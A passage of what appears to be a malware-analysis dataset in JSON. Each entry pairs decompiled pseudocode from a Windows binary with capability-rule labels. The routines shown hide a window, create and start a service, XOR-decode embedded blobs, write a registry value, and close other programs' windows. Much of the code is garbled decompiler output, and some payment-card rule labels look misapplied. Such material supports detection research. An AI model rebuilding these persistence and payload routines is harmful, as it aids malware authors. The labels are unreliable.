goto code_r0x00402ced;\n        }\n    }\n    else {\ncode_r0x00402ced:\n        *(piVar4 + -0x1f3a4905) = in_ST0;\n        puVar6 = piVar4 + -1;\n        uVar1 = 9 < (puVar6 & 0xf) | in_AF;\n        uVar3 = puVar6 + uVar1 * '\\x06';\n        uVar3 = uVar3 + (0x90 < (uVar3 & 0xf0) | uVar1 * (0xf9 < uVar3)) * '`';\n        pcVar7 = puVar6 & 0xffffff00 | uVar3;\n        *param_2 = *param_2 + 0x47c6df84;\n        *pcVar7 = *pcVar7 + uVar3;\n        puVar12[-0x75] = puVar12[-0x75] + (puVar6 >> 8);\n        uVar8 = uVar3 * puVar12[-0x79];\n        pcVar7 = puVar6 & 0xffff0000 | uVar8;\n        *param_3 = in_ST1;\n        *pcVar7 = *pcVar7 + uVar8;\n        pcVar7[0x4bb148d3] = pcVar7[0x4bb148d3] + (uVar8 >> 8);\n        out(*puVar12, uStack28);\n    }\n    *(param_3 + 4) = 0x76;\n    *(param_3 + 0x11) = 0xb3;\ncode_r0x00402d4d:\n    puVar10 = puVar10[3];\n    *puVar10 = 0x12;\n    return CONCAT44(param_2, puVar10);\n}\n",
        "token_count": 1731
    },
    "00402eb0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402eb0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407490, 0x422528, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00403710": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403875) overlaps instruction at (ram,0x00403874)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __thiscall fcn.00403710(int16_t param_1, uchar *param_2, uint *param_3)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t in_EAX;\n    uint uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    ushort unaff_SI;\n    bool in_CF;\n    bool bVar6;\n    bool in_ZF;\n    ushort uStack28;\n    ushort uStack26;\n    uint auStack24 [2];\n    \n    puVar4 = &stack0xfffffffc;\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        in_EAX = in_EAX & 0xe2f4cc58;\n    }\n    *param_2 = 0x15;\n    param_2[1] = 0xbd;\n    param_2[2] = 0x5e;\n    param_2[3] = 0xe1;\n    param_2[4] = 0x94;\n    bVar6 = (POPCOUNT(param_1 + 1U & 0xc9) & 1U) != 0;\n    uStack26 = param_2 >> 0x10;\n    uStack28 = SUB42(param_2, 0);\n    param_2[5] = 0x79;\n    if ((bVar6) && (!bVar6)) {\n        puVar5 = auStack24 + 1;\n        cVar2 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar3 = in(0x78);\n        return CONCAT44(param_2, uVar3);\n    }\n    param_2[6] = 0xba;\n    param_2[7] = 0x57;\n    param_2[8] = 0xd1;\n    param_2[9] = 0x22;\n    param_2[10] = 0xe2;\n    param_2[0xb] = 0xb8;\n    cVar2 = in_EAX & 0xffff;\n    uVar1 = (in_EAX >> 8 & 0xffff00) << 8 | in_EAX & 0xffff;\n    param_2[0xc] = 0x69;\n    if ((cVar2 < '\\x02') || ('\\x01' < cVar2)) {\n        param_2[0xd] = 0x6f;\n    }\n    else {\n        uStack28 = unaff_SI;\n        uStack26 = unaff_SI;\n        if ((POPCOUNT((uVar1 | 0xa966606f) & 0xff) & 1U) != 0) {\n            param_3 = uVar1 | 0xa966607f;\n            goto code_r0x00403878;\n        }\n    }\n    param_2 = CONCAT22(uStack26, uStack28);\ncode_r0x00403878:\n    *param_3 = 0xe;\n    return CONCAT44(param_2, param_3);\n}\n",
        "token_count": 773
    },
    "00403c70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403d43) overlaps instruction at (ram,0x00403d42)\n// \n// WARNING: Removing unreachable block (ram,0x00403d40)\n// WARNING: Removing unreachable block (ram,0x00403ce9)\n// WARNING: Removing unreachable block (ram,0x00403d0b)\n// WARNING: Removing unreachable block (ram,0x00403d63)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00403c70(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uchar *unaff_EBX;\n    uchar *puVar8;\n    uint16_t *unaff_EBP;\n    uint32_t unaff_EDI;\n    uint16_t in_ES;\n    bool bVar9;\n    bool bVar10;\n    uint32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    uint32_t auStack32 [3];\n    uint var_10h_2;\n    uint uStack16;\n    uint var_8h_2;\n    ushort uStack8;\n    ushort uStack6;\n    uint16_t uStack4;\n    ushort uStack2;\n    \n    auStack32[0] = unaff_EDI;\n    do {\n        uStack4 = unaff_EBP;\n        uStack2 = unaff_EBP >> 0x10;\n        var_8h_2._0_2_ = 0;\n        var_8h_2._2_2_ = 0;\n        bVar9 = false;\n        bVar10 = false;\n        if (var_10h < 1) {\n            return;\n        }\n        uStack16 = 1;\n        puVar6 = var_10h;\n        puVar8 = unaff_EBX;\n        unaff_EBP = &uStack4;\n        puVar5 = var_10h;\n        while( true ) {\n            uVar7 = auStack32[0];\n            if ((!bVar9) && (bVar9)) break;\n            *(unaff_EBP + -1) = *(*(unaff_EBP + -8) + *(unaff_EBP + 0x10));\n            if ((bVar10 == puVar5 < 0) && (bVar10 != puVar5 < 0)) {\n                auStack32[0] = auStack32[0] & 0xffff0000 | in_ES;\n                *(uVar7 | unaff_EBP) = *(unaff_EBP + -8);\n            }\n            *(unaff_EBP + -2) = *(*(unaff_EBP + -0xc) % *(unaff_EBP + 0xc) + *(unaff_EBP + 8));\n            iVar2 = *(unaff_EBX + -0xc);\n            uVar7 = (iVar2 + -1) % *(unaff_EBX + 0xc);\n            uStack2 = 1;\n            uStack6 = uVar7;\n            uStack4 = uVar7 >> 0x10;\n            var_8h_2._2_2_ = auStack32[0];\n            uStack8 = auStack32[0] >> 0x10;\n            uStack4 = iVar2;\n            uStack2 = iVar2 >> 0x10;\n            uVar1 = unaff_EBX[-0x10];\n            uStack4 = uVar7 & 0xffffff00 | uVar1;\n            iVar3 = *(unaff_EBX + 0x18);\n            *(iVar3 + -1 + iVar2) = uVar1 ^ unaff_EBX[-1] ^ *(uVar7 + *(unaff_EBX + 8));\n            uStack2 = (uVar7 & 0xffffff00) >> 0x10;\n            puVar8 = unaff_EBX[-2];\n            *(unaff_EBX + -0xc) = iVar2 + 2;\n            *(iVar2 + iVar3) = uVar1 ^ unaff_EBX[-2];\n            puVar4 = *(unaff_EBX + 0x14);\n            puVar6 = *(unaff_EBX + -8) + 1;\n            bVar9 = puVar6 < puVar4;\n            bVar10 = SBORROW4(puVar6, puVar4);\n            puVar5 = puVar6 - puVar4;\n            *(unaff_EBX + -8) = puVar6;\n            unaff_EBP = unaff_EBX;\n            if (puVar4 <= puVar6) {\n                return;\n            }\n        }\n        unaff_EBX = puVar8;\n        if (auStack32 < *puVar6 || puVar6 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    } while( true );\n}\n",
        "token_count": 1210
    },
    "00403da0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403da0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "00403e30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403e30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 139
    },
    "00404100": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404100(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 236
    },
    "00404380": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00404380(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405120;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    hLibModule = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &var_18h);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x407418);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar1 = (*pcVar3)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar1 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar1 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((-1 < iVar1) && (var_24h != NULL)) {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar1 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar1 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x004047b3:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x004047bf:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar1 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar1 < 0) || (var_10h == NULL)) ||\n                       (iVar1 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar1 < 0)) {\njoined_r0x0040477a:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x004047bf;\n                    }\n                    if (pbstr == 0) {\njoined_r0x004045b6:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00404190(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x40742c);\n                        if (iVar4 != 0) goto joined_r0x004045b6;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar1 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar1 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x0040475f:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x004047b3;\n                        }\n                        iVar1 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar4 = var_3ch;\n                        if (iVar1 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x0040475f;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00404190(iVar4, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar4 = fcn.004042c0(&var_148h);\n                            if (iVar4 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x0040477a;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n        }\n        if (var_24h != NULL) {\n            var_4h = var_4h._1_3_ << 8;\n            (**(*var_24h + 8))(var_24h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar1;\n}\n",
        "token_count": 2341
    },
    "004048c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004048c0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073d4);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x404840, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 376
    },
    "00401300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401320) overlaps instruction at (ram,0x0040131e)\n// \n// WARNING: Control flow encountered bad instruction data\n\nuint32_t * __cdecl fcn.00401300(uint32_t *arg_8h, int32_t arg_ch, uint8_t *arg_10h, int32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint8_t *puVar4;\n    bool bVar5;\n    \n    bVar5 = SCARRY4(arg_8h - arg_14h, arg_ch);\n    puVar2 = (arg_8h - arg_14h) + arg_ch;\n    if (((bVar5 == puVar2 < 0) && (bVar5 != puVar2 < 0)) || (arg_14h == 0)) {\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if (arg_8h <= puVar2) {\n        do {\n            if ((puVar2 <= arg_8h) && (puVar2 > arg_8h)) {\n                if (*arg_8h <= &stack0xfffffff0 && arg_8h != 0xffffffff) {\n                    return puVar1;\n                }\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            puVar1 = puVar1 & 0xffffff00 | *arg_8h;\n            if (*arg_8h == *arg_10h) {\n                puVar1 = arg_14h + -1;\n                bVar5 = true;\n                puVar3 = arg_8h;\n                puVar4 = arg_10h;\n                do {\n                    puVar4 = puVar4 + 1;\n                    puVar3 = puVar3 + 1;\n                    if (puVar1 == NULL) break;\n                    puVar1 = puVar1 + -1;\n                    bVar5 = *puVar3 == *puVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= puVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 521
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00402880(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00402eb0(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 241
    },
    "00401960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nbool __cdecl fcn.00401960(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t unaff_EBX;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    \n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        (&stack0x0000004f)[unaff_EBX * 2] = (&stack0x0000004f)[unaff_EBX * 2];\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = fcn.004032d0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 212
    },
    "00402a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a90(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402b30(&var_68h, &var_4h);\n    fcn.00403da0(&var_68h, var_4h, 0x407494, 0xa060);\n    *arg_8h = 0x407494;\n    *arg_ch = 0xa060;\n    return;\n}\n",
        "token_count": 238
    },
    "00403890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004038ae)\n// WARNING: Removing unreachable block (ram,0x004038b6)\n\nvoid __cdecl fcn.00403890(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403710();\n    fcn.00403da0(&var_68h, var_4h, 0x4114f4, 0x11000);\n    *arg_8h = 0x4114f4;\n    *arg_ch = 0x11000;\n    return;\n}\n",
        "token_count": 262
    },
    "00403ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403ea0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(var_4h + arg_8h) = iVar1 % 0x1a + 'a';\n            var_4h = var_4h + 1;\n        } while (var_4h < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00404190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404190(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00404e90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404e90(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00401740(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 247
    },
    "00401bb0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401bcc) overlaps instruction at (ram,0x00401bc8)\n// \n\nint32_t ** __fastcall fcn.00401bb0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t **ppiVar3;\n    int32_t *unaff_ESI;\n    int32_t **unaff_EDI;\n    bool in_CF;\n    char in_ZF;\n    \n    if (((!in_CF) && (in_CF)) && (param_1 = param_1 + -1,  param_1 != 0 && in_ZF != '\\0')) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return unaff_EDI;\n    }\n    iVar1 = *unaff_ESI;\n    *unaff_EDI = unaff_ESI + 1;\n    uVar2 = *0x9750e2b5;\n    *(iVar1 >> 0x1f) = *(iVar1 >> 0x1f) | param_1 >> 8;\n    ppiVar3 = (*_sym.imp.KERNEL32.dll_CreateFileA)(uVar2, 0xc0000000, 1, 0, 3, 0x80);\n    return ppiVar3;\n}\n",
        "token_count": 290
    },
    "004011a0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401201) overlaps instruction at (ram,0x004011fd)\n// \n\nvoid __cdecl fcn.004011a0(uint *arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    bool bVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t in_EDX;\n    uint8_t uVar6;\n    uchar *puVar7;\n    bool bVar8;\n    \n    puVar7 = &stack0xfffffffc;\n    uVar5 = 0;\n    bVar8 = false;\n    if (0 < arg_14h) {\n        do {\n            bVar2 = CARRY4(arg_14h + 0x311c8a2f, bVar8);\n            if ((0xcee375d0 < arg_14h || bVar2) ||\n               (uVar4 = arg_14h + 0x311c8a2f + bVar8,  0xcee375d0 >= arg_14h && !bVar2)) {\n                in_EDX = uVar5 >> 0x1f;\n                uVar4 = uVar5;\n            }\n            arg_8h = arg_8h ^ *(arg_8h + 0xe58be73);\n            iVar3 = CONCAT44(in_EDX, uVar4) % *(puVar7 + 0xc);\n            uVar6 = puVar7 + 0x76U ^ *(iVar3 + arg_8h);\n            bVar8 = uVar6 != 0;\n            if (((bVar8) && (!bVar8)) || (bVar8)) {\n                *arg_8h = *arg_10h;\n                puVar7 = 0x76e181d0;\n                puVar1 = arg_10h + 0x62;\n                *puVar1 = *puVar1 | iVar3;\n                arg_10h = arg_10h + 1;\n                arg_8h = arg_8h + 1;\n                if (*puVar1 == 0) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n            }\n            arg_14h = *(puVar7 + 0x14);\n            